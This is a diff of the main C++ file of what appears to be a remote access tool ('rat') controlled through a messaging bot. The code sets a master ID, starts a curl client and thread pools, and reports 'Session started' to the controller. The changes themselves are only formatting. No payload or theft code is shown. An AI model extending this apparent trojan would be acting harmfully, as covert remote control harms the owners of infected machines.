@@ -2,6 +2,7 @@
 #include "rat/Handler.hpp"
 #include "rat/system.hpp"
 #include "rat/tbot/tbot.hpp"
+
 #include <csignal>
 #include <cstdint>
 #include <fmt/chrono.h>
@@ -14,7 +15,6 @@ constexpr uint8_t NUMBER_OF_THREADS_INSISDE_HELPER_POOL = 2;
 constexpr uint8_t NETWORKING_OPERATION_RESTART_BOUND = 5;
 
 int main(void) {
-
 	rat::handler::Handler session_handler;
 
 	session_handler.setMasterId(MASTER_ID);
@@ -23,10 +23,13 @@ int main(void) {
 
 	session_handler.initCurlClient(NETWORKING_OPERATION_RESTART_BOUND);
 
-	session_handler.initThreadPools(NUMBER_OF_THREADS_INSISDE_SHORT_PROCESS_POOL, NUMBER_OF_THREADS_INSISDE_LONG_PROCESS_POOL,
-									NUMBER_OF_THREADS_INSISDE_HELPER_POOL);
+	session_handler.initThreadPools(
+	    NUMBER_OF_THREADS_INSISDE_SHORT_PROCESS_POOL,
+	    NUMBER_OF_THREADS_INSISDE_LONG_PROCESS_POOL,
+	    NUMBER_OF_THREADS_INSISDE_HELPER_POOL);
 
-	session_handler.bot->sendMessage(fmt::format("Session started at: {}", ::rat::system::getCurrentDateTime()));
+	session_handler.bot->sendMessage(fmt::format(
+	    "Session started at: {}", ::rat::system::getCurrentDateTime()));
 
 	session_handler.handleUpdates();
 
